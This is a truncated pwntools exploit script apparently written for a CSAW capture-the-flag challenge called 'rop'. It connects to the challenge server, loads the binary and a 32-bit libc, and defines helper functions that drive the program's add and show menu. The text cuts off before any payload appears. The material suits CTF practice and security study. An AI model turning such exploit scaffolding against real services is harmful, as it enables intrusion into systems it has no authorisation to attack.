import _struct

from pwn import *

#context.log_level = 'debug'

r = remote('pwn.chal.csaw.io', 8001)

#r = process('./rop')

e = ELF('./rop')

#libc = e.libc

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc = ELF('/lib/i386-linux-gnu/libc.so.6')

#gdb.attach(r, '''

#b *0x08048e6f

#''')

def add(name, age, comment):

r.recvuntil('>')

r.sendline('1')

r.recvuntil('name:')

r.sendline(name)

r.recvuntil('age:')

r.sendline(str(age))

r.recvuntil('comment:')

r.sendline(comment)

def show():

r.recv
